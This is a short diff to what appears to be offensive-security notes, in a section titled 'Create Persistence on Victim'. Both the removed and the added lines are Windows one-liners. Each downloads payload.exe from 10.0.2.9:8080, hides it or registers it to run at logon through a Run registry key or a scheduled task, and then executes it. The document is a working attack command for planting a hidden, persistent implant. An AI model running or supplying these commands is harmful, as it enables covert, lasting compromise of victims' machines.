@@ -30,5 +30,5 @@ Setup Listener
 ## Create Persistence on Victim
 
 ```
-curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe" http://10.0.2.9:8080/payload.exe && reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Background /t REG_SZ /d "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe""
+curl -o "%APPDATA%\background.exe" http://10.0.2.9:8080/payload.exe && attrib +h "%APPDATA%\background.exe" && schtasks /create /sc onlogon /tn "Background" /tr "\"%APPDATA%\background.exe\"" /f && start "" "%APPDATA%\background.exe"
 ```
